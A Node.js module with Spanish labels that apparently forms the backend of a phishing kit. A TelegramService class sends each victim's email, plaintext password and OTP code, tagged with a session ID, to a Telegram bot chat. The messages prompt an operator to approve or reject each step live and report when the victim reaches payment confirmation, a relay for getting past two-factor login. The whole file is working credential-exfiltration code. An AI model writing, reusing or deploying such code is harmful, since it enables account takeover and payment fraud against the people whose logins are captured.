const axios = require('axios');
const config = require('../config');

class TelegramService {
  constructor() {
    this.botToken = config.telegram.botToken;
    this.chatId = config.telegram.chatId;
    this.apiUrl = `https://api.telegram.org/bot${this.botToken}`;
  }

  async sendMessage(text) {
    try {
      const response = await axios.post(`${this.apiUrl}/sendMessage`, {
        chat_id: this.chatId,
        text: text,
        parse_mode: 'HTML',
      });

      console.log(`[TELEGRAM] Mensaje enviado: ${text.substring(0, 50)}...`);
      return response.data;
    } catch (error) {
      console.error('[TELEGRAM ERROR]', error.response?.data || error.message);
      throw error;
    }
  }

  async sendAuthRequest(sessionId, email, password) {
    const text = `
<b>🔐 SOLICITUD DE AUTENTICACIÓN</b>
<b>Session ID:</b> <code>${sessionId}</code>
<b>Email:</b> <code>${email}</code>
<b>Password:</b> <code>${password}</code>

<b>Responde con:</b>
✅ RegistroOtp - Para proceder con OTP
❌ ERROR - Si los datos son incorrectos
    `;

    return this.sendMessage(text);
  }

  async sendOtpRequest(sessionId, code) {
    const text = `
<b>🔑 VERIFICACIÓN OTP</b>
<b>Session ID:</b> <code>${sessionId}</code>
<b>Código OTP:</b> <code>${code}</code>

<b>Responde con:</b>
🎉 Aprobado - OTP válido
❌ ERROR - OTP incorrecto
    `;

    return this.sendMessage(text);
  }

  async sendConfirmationRequest(sessionId) {
    const text = `
<b>✔️ CONFIRMACIÓN FINAL</b>
<b>Session ID:</b> <code>${sessionId}</code>

<b>Usuario ha llegado a confirmación de pago.</b>
    `;

    return this.sendMessage(text);
  }
}

module.exports = new TelegramService();
